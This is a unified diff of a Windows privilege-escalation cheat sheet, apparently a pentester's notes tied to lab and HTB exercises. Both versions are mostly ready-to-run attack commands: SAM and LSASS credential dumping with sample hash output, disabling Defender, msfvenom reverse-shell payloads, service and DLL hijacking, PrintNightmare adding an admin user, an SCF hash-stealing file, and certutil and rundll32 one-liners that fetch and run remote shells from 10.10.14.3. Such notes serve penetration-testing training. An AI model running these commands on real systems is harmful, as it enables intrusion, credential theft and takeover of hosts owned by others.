@@ -1,626 +1,566 @@
-# Windows Privlage Escalation
-
-## Windows Privlage Escalation
-
-### Resources&#x20;
-
-[HackTricks](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)\
-[Fuzzy security](http://www.fuzzysecurity.com/tutorials/16.html)
-
-* https://lolbas-project.github.io/&#x20;
-* [https://wadcoms.github.io/](https://wadcoms.github.io/)
-
-Windows 10 Exploits:
-
-* https://github.com/nu11secur1ty/Windows10Exploits &#x20;
-
-### Low Hanging Fruit&#x20;
-
-[Reference](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
-
-```
-whoami /priv 
-SeImpersonatePrivilege -> PrintSpoofer, Juicy Potato, Rogue Potato, Hot Potato
-SeAssignPrimaryTokenPrivilege -> Juicy Potato 
-SeTakeOwnershipPrivilege ->  become the owner of any object and modify the DACL to grant access.  
-SeBackup-> can create copy of sam system and run impacket script to dump hashes
-
-
-If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato
-If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato
-```
-
-* Check the current tokens you have and any ability to escalate from your tokens&#x20;
-* <pre><code><strong>https://github.com/gtworek/Priv2Admin
-  </strong>https://ppn.snovvcrash.rocks/pentest/infrastructure/post-exploitation
-  </code></pre>
-
-### SeBackupPrivilege
-
-* from sliver session can see privs&#x20;
-* [https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md](https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md)
-
-```
-getprivs
-
-Privilege Information for cicada.htb.exe (PID: 3848)
-----------------------------------------------------
-
-Process Integrity Level: High
-
-Name                          	Description                    	Attributes
-====                          	===========                    	==========
-SeBackupPrivilege             	Back up files and directories  	Enabled, Enabled by Default
-SeRestorePrivilege            	Restore files and directories  	Enabled, Enabled by Default
-SeShutdownPrivilege           	Shut down the system           	Enabled, Enabled by Default
-SeChangeNotifyPrivilege       	Bypass traverse checking       	Enabled, Enabled by Default
-SeIncreaseWorkingSetPrivilege 	Increase a process working set 	Enabled, Enabled by Default
-```
-
-* backup the registry hives&#x20;
-
-```
-cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
-cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
-```
-
-* download files and then use `impacket secretsdump.py`
-
-```
-python3 /opt/impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
-[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-```
-
-### Credentials in Process Command Lines
-
-Processes may have credentials passed as command line arguments. Always check running processes.
-
-```powershell
-# PowerShell - Get full command lines
-Get-CimInstance Win32_Process | Select-Object ProcessId,Name,CommandLine | Format-List
-
-# WMIC - Full command line
-wmic process get processid,name,commandline
-```
-
-**Note:** For Sliver C2 process enumeration with `ps -c -f`, see the [Sliver guide](../c2-frameworks/sliver.md).
-
----
-
-### Search for files with passwords in them&#x20;
-
-* Perform a basic search
-
-```
-findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
-findstr /SIM /C:"pass" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
-findstr /SIM /C:"config" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
-findstr /SIM /C:"git" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
-findstr /SIM /C:"router" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
-findstr /SIM /C:"ansible" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
-
-dir c:\*password* /s
-dir c:\*pass* /s
-dir c:\*login* /s
-dir c:\*finance* /s
-dir c:\*.key /s
-dir c:\*.ica /s
-dir c:\*.pwd* /s
-dir c:\*.config* /s
-dir c:\*access* /s
-```
-
-* List all files of interest recursively (great for triage)
-
-```
-dir /S /B *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
-```
-
-* PowerShell recursive file discovery and keyword search
-
-```powershell
-Get-ChildItem -Recurse -Path "C:\" -Include @("*.txt", "*.ini", "*.cfg", "*.config", "*.xml", "*.git", "*.ps1", "*.yml", "*.bat", "*.vbs", "*.py", "*.yaml")
-
-Get-ChildItem -Recurse -Path "C:\Company" -Include @("*.txt", "*.ini", "*.cfg", "*.config", "*.xml", "*.git", "*.ps1", "*.yml", "*.bat", "*.vbs", "*.py", "*.yaml") | Select-String "password"
-```
-
-* Search for directories named Confidential
-
-```powershell
-Get-ChildItem -Recurse -Directory -Filter "Confidential" -ErrorAction SilentlyContinue
-```
-
-* PowerShell finds by file type
-
-```powershell
-Get-ChildItem -Path "C:\Users" -Filter *.doc -Recurse
-Get-ChildItem -Path "C:\Users" -Filter *.xlxs -Recurse
-Get-ChildItem -Path "C:\Users" -Filter *.xls -Recurse
-```
-
-* Find strings in `.config` files
-
-```
-dir /s *pass* == *cred** == *vnc* == *.config*
-```
-
-* Find all passwords in all files
-
-```
-findstr /spin "password" *.*
-```
-
-### Unattended Setup
-
-* Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode."
-* Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode." It is also where users passwords are stored in base64. Navigate to:
-* Password files that could have base64 encoded credentials&#x20;
-
-<pre><code>Unattended files
-dir C:\Windows\sysprep\sysprep.xml
-dir C:\Windows\sysprep\sysprep.inf
-dir C:\Windows\sysprep.inf
-dir C:\Windows\Panther\Unattended.xml
-dir C:\Windows\Panther\Unattend.xml
-dir C:\Windows\Panther\Unattend\Unattend.xml
-<strong>dir C:\Windows\Panther\Unattend\Unattended.xml
-</strong>dir C:\Windows\System32\Sysprep\unattend.xml
-<strong>dir C:\Windows\System32\Sysprep\unattended.xml
-</strong><strong>dir C:\unattend.txt
-</strong>dir C:\unattend.inf
-dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
-
-dir C:\*.vnc.ini /s /b
-dir C:\*ultravnc.ini /s /b
-dir C:\ /s /b | findstr /si *vnc.ini
-</code></pre>
-
-### Search Registry for Passwords
-
-```
-reg query HKLM /f password /t REG_SZ /s      #admin needed
-reg query HKCU /f password /t REG_SZ /s
-```
-
-### Powershell
-
-```
-powershell.exe -nop -ep bypass    
-Get-ExecutionPolicy    
-Set-ExecutionPolicy Unrestricted   
-Set-MpPreference -DisableRealtimeMonitoring $true   
-```
-
-* Powershell history
-* Windows powershell saves all previous commands into a file called `ConsoleHost_history.txt` This is located at:
-
-```
-dir %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-```
-
-#### Windows Kernel Versions
-
-* systeminfo
-
-```
-Kernel 6.1 - Windows 7 / Windows Server 2008 R2  
-Kernel 6.2 - Windows 8 / Windows Server 2012  
-Kernel 6.3 - Windows 8.1 / Windows Server 2012 R2  
-Kernel 10 - Windows 10 / Windows Server 2016 / Windows Server 2019 / Windows 11 / Windows Server 2022
-```
-
-#### Important Files
-
-<pre><code><strong>dir %SYSTEMROOT%\System32\drivers\etc\hosts                   #local DNS entries 
-</strong>dir %SYSTEMROOT%\System32\drivers\etc\networks                #network config
-dir %SYSTEMROOT%\Prefetch                                     #prefetch dir, exe logs
-dir %WINDIR%\system32\config\AppEvent.Evt                     #application logs
-dir %WINDIR%\system32\config\SecEvent.Evt                     #security logs
-</code></pre>
-
-### Scripts
-
-**You might want to check for AV first!**\
-[Scripts Reference](https://www.hackingarticles.in/window-privilege-escalation-automated-script/)
-
-[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)\
-[Other compiled binaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)\
-[nishang](https://github.com/samratashok/nishang)\
-[JAWS](https://github.com/411Hall/JAWS)\
-[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)\
-[PrivEscCheck](https://github.com/itm4n/PrivescCheck)\
-[Windows Exploit Suggester (Next-Generation)](https://github.com/bitsadmin/wesng) [Sherlock](https://github.com/rasta-mouse/Sherlock) [Priv2Admin](https://github.com/gtworek/Priv2Admin) OS privileges to system
-
-[Compiled scripts here](https://github.com/Scr1ptK1ddie/WindowsBinaries)
+# Windows Privilege Escalation
+
+## Useful Tools
+
+| Tool | Description |
+|---|---|
+| [Seatbelt](https://github.com/GhostPack/Seatbelt) | C# local priv esc checks |
+| [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) | Automated priv esc enumeration |
+| [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) | PowerShell priv esc finder |
+| [SharpUp](https://github.com/GhostPack/SharpUp) | C# version of PowerUp |
+| [Watson](https://github.com/rasta-mouse/Watson) | .NET missing KB / exploit suggester |
+| [LaZagne](https://github.com/AlessandroZ/LaZagne) | Retrieve stored passwords |
+| [SessionGopher](https://github.com/Arvanaghi/SessionGopher) | Extract saved session info (PuTTY, WinSCP, RDP, etc.) |
+| [WES-NG](https://github.com/bitsadmin/wesng) | Windows Exploit Suggester based on systeminfo |
+| [JAWS](https://github.com/411Hall/JAWS) | PowerShell 2.0 priv esc enumeration |
+| [PrivescCheck](https://github.com/itm4n/PrivescCheck) | PowerShell priv esc enumeration |
+| [nishang](https://github.com/samratashok/nishang) | PowerShell offensive framework |
+| [Priv2Admin](https://github.com/gtworek/Priv2Admin) | OS privileges to SYSTEM reference |
+
+- Upload tools to `C:\Windows\Temp` (writable by BUILTIN\Users)
+- Precompiled Seatbelt/SharpUp: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
 
 ### Run PowerUp
 
-```
+```powershell
 . .\PowerUp.ps1
 Invoke-AllChecks
 ```
 
-### Kernel Exploits
+## Initial Enumeration
 
-* https://github.com/SecWiki/windows-kernel-exploits
-
-### Admin Service that a Standard User can run
-
-* https://www.youtube.com/watch?v=3BQKpPNlTSo
-
-### Run Executable in Background
-
+### System Information
+```cmd
+systeminfo
+wmic qfe list brief
+hostname
 ```
-start /B program
-```
-
-### Disable/Enable Group Policy
-
-* Disable:
-
-```
-REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1 /f
+```powershell
+Get-HotFix | ft -AutoSize
+[environment]::OSVersion.Version
 ```
 
-* enable&#x20;
+#### Windows Kernel Versions
 
 ```
-REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /0 REG_DWORD /d 1 /f
+Kernel 6.1 - Windows 7 / Windows Server 2008 R2
+Kernel 6.2 - Windows 8 / Windows Server 2012
+Kernel 6.3 - Windows 8.1 / Windows Server 2012 R2
+Kernel 10  - Windows 10 / Windows Server 2016 / Windows Server 2019 / Windows 11 / Windows Server 2022
 ```
 
-### Add Admin and Enable RDP
+### Running Processes & Services
+```cmd
+tasklist /svc
+wmic product get name
+netstat -ano
+```
+```powershell
+Get-WmiObject -Class Win32_Product | select Name, Version
+Get-Process
+Get-Service | Where-Object {$_.Status -eq "Running"}
+```
+
+### User & Group Info
+```cmd
+whoami /priv
+whoami /groups
+echo %USERNAME%
+net user
+net localgroup
+net localgroup administrators
+net accounts
+query user
+```
+
+### Network Info
+```cmd
+ipconfig /all
+arp -a
+route print
+```
+
+### Environment Variables
+```cmd
+set
+```
+
+### Enumerating Protections
+```powershell
+Get-MpComputerStatus
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
+```
+
+### Installed Programs
+```cmd
+wmic product get name
+```
+```powershell
+Get-WmiObject -Class Win32_Product | select Name, Version
+```
+
+### Named Pipes
+```cmd
+pipelist.exe /accepteula
+accesschk.exe /accepteula \\.\Pipe\lsass -v
+accesschk.exe -w \pipe\* -v
+```
+```powershell
+gci \\.\pipe\
+```
+
+### Important Files
+```cmd
+dir %SYSTEMROOT%\System32\drivers\etc\hosts
+dir %SYSTEMROOT%\System32\drivers\etc\networks
+dir %SYSTEMROOT%\Prefetch
+dir %WINDIR%\system32\config\AppEvent.Evt
+dir %WINDIR%\system32\config\SecEvent.Evt
+```
+
+### PowerShell Setup
+```powershell
+powershell.exe -nop -ep bypass
+Get-ExecutionPolicy
+Set-ExecutionPolicy Unrestricted
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+## Token Privileges (Low Hanging Fruit)
+
+- Check current tokens and see if you can escalate: `whoami /priv`
+- Reference: https://github.com/gtworek/Priv2Admin
 
 ```
-Add Admin & Enable RDP
+SeImpersonatePrivilege          -> PrintSpoofer, Juicy Potato, Rogue Potato, Hot Potato
+SeAssignPrimaryTokenPrivilege   -> Juicy Potato
+SeTakeOwnershipPrivilege        -> become owner of any object, modify DACL to grant access
+SeBackupPrivilege               -> copy SAM/SYSTEM, dump hashes with impacket
+```
+
+- If machine is >= Windows 10 1809 / Windows Server 2019 -> Try Rogue Potato
+- If machine is < Windows 10 1809 / Windows Server 2019 -> Try Juicy Potato
+
+### SeBackupPrivilege
+
+- If you have SeBackupPrivilege, you can backup the registry hives and dump hashes
+- Reference: https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md
+
+```cmd
+reg save HKLM\SAM SAM
+reg save HKLM\SYSTEM SYSTEM
+```
+
+- Download files and use impacket secretsdump
+
+```bash
+python3 /opt/impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
+```
+
+## Weak Permissions
+
+### Permissive File System ACLs
+```powershell
+.\SharpUp.exe audit
+```
+```cmd
+icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+```
+- If BUILTIN\Users or Everyone has (F) or (M) on a service binary, replace it with a malicious one
+- `cmd /c copy /Y malicious.exe "C:\path\to\service.exe"` then `sc start ServiceName`
+
+### Weak Service Permissions
+```cmd
+accesschk.exe /accepteula -quvcw ServiceName
+sc config ServiceName binpath= "cmd /c net localgroup administrators htb-student /add"
+sc stop ServiceName
+sc start ServiceName
+```
+- Check for `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG` for `NT AUTHORITY\Authenticated Users` or similar
+
+### Service Escalation via binpath Change
+
+```cmd
+sc.exe qc VulnerableService
+sc.exe config VulnerableService binPath= "C:\path\to\payload.exe"
+sc.exe start VulnerableService
+```
+
+### Unquoted Service Path
+```cmd
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+sc qc ServiceName
+```
+```powershell
+Get-CIMInstance -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
+```
+- Windows tries: `C:\Program.exe`, `C:\Program Files.exe`, `C:\Program Files (x86)\System.exe`, etc.
+- Place executable at one of these paths if writable
+
+### Permissive Registry ACLs
+```cmd
+accesschk.exe /accepteula "username" -kvuqsw hklm\System\CurrentControlSet\services
+```
+```powershell
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName -Name "ImagePath" -Value "C:\path\to\payload.exe"
+```
+
+### Modifiable Registry Autorun Binary
+```powershell
+Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+```
+
+### AlwaysInstallElevated
+
+- Both must be set to 1 for exploitation:
+
+```cmd
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+```
+
+- Generate malicious MSI and install:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp lhost=ATTACKER_IP -f msi -o setup.msi
+```
+```cmd
+msiexec /quiet /qn /i C:\Temp\setup.msi
+```
+
+### Startup Applications
+
+- Check if BUILTIN\Users has full access (F) to the Startup directory:
+
+```cmd
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+```
+
+- Drop a payload there; it executes when an admin logs in
+
+### DLL Hijacking
+
+- Use Process Monitor (procmon) to find DLLs with `NAME NOT FOUND` result loaded by a vulnerable service
+- Compile a malicious DLL and place it in the writable search path
+
+```bash
+x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
+```
+```cmd
+sc stop dllsvc & sc start dllsvc
+```
+
+## Kernel Exploits
+
+### Enumerating Missing Patches
+```cmd
+systeminfo
+wmic qfe list brief
+```
+```powershell
+Get-Hotfix
+```
+
+- Kernel exploit repos: https://github.com/SecWiki/windows-kernel-exploits
+
+### Notable Vulnerabilities
+- **MS08-067**: RCE in Server service (Windows 2000/2003/2008, XP/Vista)
+- **MS17-010 (EternalBlue)**: SMBv1 RCE - can also be used for local priv esc via port forwarding
+- **CVE-2020-0668**: Windows Kernel Elevation of Privilege via Service Tracing arbitrary file move
+- **CVE-2021-1675/CVE-2021-34527 (PrintNightmare)**: Print Spooler RCE/LPE
+- Windows 10 exploits collection: https://github.com/nu11secur1ty/Windows10Exploits
+
+### HiveNightmare (CVE-2021-36934)
+```cmd
+icacls c:\Windows\System32\config\SAM
+```
+- If BUILTIN\Users has (RX), the system is vulnerable
+```powershell
+.\HiveNightmare.exe
+```
+```bash
+impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
+```
+
+### PrintNightmare Local Priv Esc
+```powershell
+ls \\localhost\pipe\spoolss
+Set-ExecutionPolicy Bypass -Scope Process
+Import-Module .\CVE-2021-1675.ps1
+Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
+```
+
+## Vulnerable Services
+- Always enumerate installed software: `wmic product get name`
+- Search for known vulnerable versions (e.g., Druva inSync 6.6.3, Splunk Universal Forwarder)
+- Check for localhost-only services: `netstat -ano | findstr LISTENING`
+- Map PID to process: `get-process -Id <PID>`
+
+## User Account Control (UAC) Bypass
+
+### Check UAC Status
+```cmd
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+```
+
+### UAC Bypass via DLL Hijacking (SystemPropertiesAdvanced.exe)
+- Target: `srrstr.dll` loaded by 32-bit `SystemPropertiesAdvanced.exe`
+- Place malicious DLL in `C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll`
+```cmd
+C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+```
+
+### UACME
+- https://github.com/hfiref0x/UACME - comprehensive list of UAC bypasses by Windows build
+
+## Credential Hunting
+
+### Search for Files with Passwords
+```cmd
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+findstr /spin "password" *.*
+
+dir c:\*password* /s
+dir c:\*pass* /s
+dir c:\*login* /s
+dir c:\*.key /s
+dir c:\*.pwd* /s
+dir c:\*.config* /s
+dir /S /B *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+```
+```powershell
+Get-ChildItem -Recurse -Path "C:\" -Include @("*.txt","*.ini","*.cfg","*.config","*.xml","*.ps1","*.yml","*.bat","*.vbs","*.py","*.yaml") -ErrorAction SilentlyContinue | Select-String "password"
+Get-ChildItem -Recurse -Directory -Filter "Confidential" -ErrorAction SilentlyContinue
+Get-ChildItem -Path "C:\Users" -Filter *.kdbx -Recurse -ErrorAction SilentlyContinue
+```
+
+### Unattended Setup Files
+- May contain base64-encoded credentials
+
+```cmd
+dir C:\Windows\sysprep\sysprep.xml
+dir C:\Windows\sysprep\sysprep.inf
+dir C:\Windows\Panther\Unattended.xml
+dir C:\Windows\Panther\Unattend.xml
+dir C:\Windows\Panther\Unattend\Unattend.xml
+dir C:\Windows\System32\Sysprep\unattend.xml
+dir C:\unattend.txt
+dir C:\unattend.inf
+dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
+```
+
+### Search Registry for Passwords
+```cmd
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+
+### PowerShell History
+```cmd
+dir %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+```powershell
+Get-Content (Get-PSReadLineOption).HistorySavePath
+```
+
+### Credentials in Process Command Lines
+
+```powershell
+Get-CimInstance Win32_Process | Select-Object ProcessId,Name,CommandLine | Format-List
+```
+```cmd
+wmic process get processid,name,commandline
+```
+
+### LSASS Credential Dumping
+```cmd
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+```
+mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonpasswords
+```
+
+### LaZagne
+```cmd
+start LaZagne.exe all
+```
+- Modules: browsers, chats, mails, memory, sysadmin, windows, wifi
+
+### Additional Credential Locations
+- Passwords in Group Policy (SYSVOL share)
+- `web.config` files on dev machines
+- `unattend.xml`
+- AD user/computer description fields
+- KeePass databases (`*.kdbx`)
+- Files named `pass.txt`, `passwords.docx`, etc.
+- VNC config files: `dir C:\*.vnc.ini /s /b` and `dir C:\*ultravnc.ini /s /b`
+
+### Credential Search Terms
+Key terms to grep for: `password`, `passphrase`, `keys`, `username`, `creds`, `users`, `passkeys`, `configuration`, `dbcredential`, `dbpassword`, `pwd`, `login`, `credentials`
+
+## Interacting with Users
+
+### SCF File Attack (Steal NTLMv2 Hashes)
+```
+[Shell]
+Command=2
+IconFile=\\10.10.14.3\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+- Name it `@Inventory.scf` and place on heavily used file share
+- Start Responder: `sudo responder -wrf -v -I tun0`
+- Crack captured NTLMv2: `hashcat -m 5600 hash.txt rockyou.txt`
+
+### Process Command Line Monitoring
+```powershell
+while($true) {
+  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $process -DifferenceObject $process2
+}
+```
+
+### Traffic Capture
+- If Wireshark is installed, unprivileged users may be able to capture traffic
+- Use `net-creds` to sniff passwords from pcap or live interface
+
+## Post-Exploitation Quickwins
+
+### Add Admin & Enable RDP
+```cmd
 net user /add hacked Password1
 net localgroup administrators hacked /add
-net localgroup Administrateurs hacked /add (For French target)
 net localgroup "Remote Desktop Users" hacked /add
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
 netsh firewall set service type = REMOTEDESKTOP mode = ENABLE scope = CUSTOM addresses = 10.0.0.1
 ```
 
-### SMB File Transfer
-
-* On kali box:
-
+### Disable/Enable Group Policy
+```cmd
+REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1 /f
 ```
+
+### Run Executable in Background
+```cmd
+start /B program
+```
+
+### SMB File Transfer
+- On Kali:
+```bash
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
 ```
-
-* On Windows (update the IP address with your Kali IP):
-
-```
+- On Windows:
+```cmd
 copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
 ```
 
 ### xfreerdp
-
-```
-xfreerdp /v:10.10.25.227 /u:Wade /p:parzival /cert:ignore /drive:/usr/share/windows-resources,share /dynamic-resolution
-proxychains -f proxy9051.conf xfreerdp +clipboard /v:10.10.120.5 /d:RLAB /u:'SQL01$' /pth:47b071ssddff02d0f06770137996c /sec:nla /cert:ignore /drive:/home/kali/Documents/htb/rasta/map,share
+```bash
+xfreerdp /v:TARGET_IP /u:USER /p:PASS /cert:ignore /drive:/usr/share/windows-resources,share /dynamic-resolution
 ```
 
-**Credit**
+## Scheduled Tasks
 
-* Taken from Tib3rius
-
-### Basic Enumeration
-
-* Find out the users on the box and enumerate their privlages
-
+### Enumerate Scheduled Tasks
+```cmd
+schtasks /query /fo LIST /v
 ```
-net users
-net users Administrator
+```powershell
+Get-ScheduledTask | select TaskName, State
 ```
 
-### Registry Escalation - Autoruns
-
-* Detection
-* Open command prompt and type:
-
+### Exploit Writable Task Scripts
+- If a scheduled task runs a script you can write to:
+```cmd
+schtasks /query /fo LIST /v | findstr /B /C:"Task To Run" /C:"Run As User" /C:"Schedule Type"
 ```
-C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
+- Check the script's ACL:
+```cmd
+icacls C:\Scripts\task_script.bat
 ```
+- If writable, replace contents with a reverse shell or adduser command
 
-* In Autoruns, click on the `Logon` tab.
-* From the listed results, notice that the “My Program” entry is pointing to
-
+## User/Computer Description Field
+- Sysadmins sometimes store passwords in user or computer description fields
+```powershell
+Get-LocalUser | select Name, Description
 ```
-C:\Program Files\Autorun Program\program.exe
-```
-
-* In command prompt type:
-
-```
-C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
+```powershell
+Get-WmiObject -Class Win32_OperatingSystem | select Description
 ```
 
-* From the output, notice that the `"Everyone"` user group has `"FILE_ALL_ACCESS"` permission on the `"program.exe"` file.
-* Exploitation
-* Kali VM
-* Open command prompt and type: `msfconsole`
-* In Metasploit (msf > prompt) type: `use multi/handler`
-* In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp` or `windows/x64/shell/reverse_tcp`
-* In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
-* In Metasploit (msf > prompt) type: `run`
-* Open an additional command prompt and type: `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe`
-* Copy the generated file, `program.exe`, to the Windows VM.
-* Windows VM
-* Place `program.exe` in `C:\Program Files\Autorun Program`
-* To simulate the privilege escalation effect, logoff and then log back on as an administrator user.
-* Kali VM
-* Wait for a new session to open in Metasploit.
-* In Metasploit (msf > prompt) type: `sessions -i [Session ID]`
-* To confirm that the attack succeeded, in Metasploit (msf > prompt) type: `getuid`
+## LOLBAS (Living Off The Land Binaries and Scripts)
 
-### Registry Escalation AlwaysInstallElevated
+- https://lolbas-project.github.io/
 
-* Detection
-* Windows VM
-* Open command prompt and type:
-
-```
-reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+### certutil - File Transfer / Encode
+```cmd
+certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.exe C:\Windows\Temp\shell.exe
+certutil -encode payload.exe payload.b64
+certutil -decode payload.b64 payload.exe
 ```
 
-* From the output, notice that `AlwaysInstallElevated` value is `1`.
-* In command prompt type:
-
-```
-reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+### rundll32 - Execute DLL
+```cmd
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.3/shell.ps1')");
 ```
 
-* From the output, notice that `AlwaysInstallElevated` value is `1`.
-* Exploitation
-* Kali VM
-* Open command prompt and type: msfconsole
-* In Metasploit (msf > prompt) type: `use multi/handler`
-* In Metasploit (msf > prompt) type: set payload `windows/meterpreter/reverse_tcp` or `windows/shell_reverse_tcp`
-* In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
-* In Metasploit (msf > prompt) type: `run`
-* Open an additional command prompt and type:
+## CVE-2019-1388 - Windows Certificate Dialog LPE
+- Affects older Windows versions (pre-patch)
+- Run a signed executable as admin, click "Show information about the publisher's certificate"
+- In the Issuer Statement link, a browser opens as SYSTEM
+- Use browser's "Save As" dialog to launch `cmd.exe`
 
+## Legacy Operating Systems
+
+### Windows Server 2008 / Windows 7
+- End-of-Life, no more security patches
+- Missing modern protections (AMSI, Credential Guard, etc.)
+- Use **Sherlock** or **Windows-Exploit-Suggester** for kernel exploit identification:
+```powershell
+# Sherlock
+Set-ExecutionPolicy bypass -Scope process
+Import-Module .\Sherlock.ps1
+Find-AllVulns
 ```
-msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
-```
-
-* Copy the generated file, setup.msi, to the Windows VM.
-
-Windows VM
-
-* Place `setup.msi` in `C:\Temp`.
-* Open command prompt and type:
-
-```
-msiexec /quiet /qn /i C:\Temp\setup.msi
-```
-
-### Service Escalation via Changing binpath
-
-* Query the interesting service
-
-```
-sc.exe qc IObitUnSvr
-SERVICE_NAME: IObitUnSvr
-        TYPE               : 10  WIN32_OWN_PROCESS 
-        START_TYPE         : 2   AUTO_START
-        ERROR_CONTROL      : 0   IGNORE
-        BINARY_PATH_NAME   : 
-        LOAD_ORDER_GROUP   : 
-        TAG                : 0
-        DISPLAY_NAME       : IObit Uninstaller Service
-        DEPENDENCIES       : 
-        SERVICE_START_NAME : LocalSystem
+```bash
+# Windows Exploit Suggester
+python2.7 windows-exploit-suggester.py --update
+python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
 ```
 
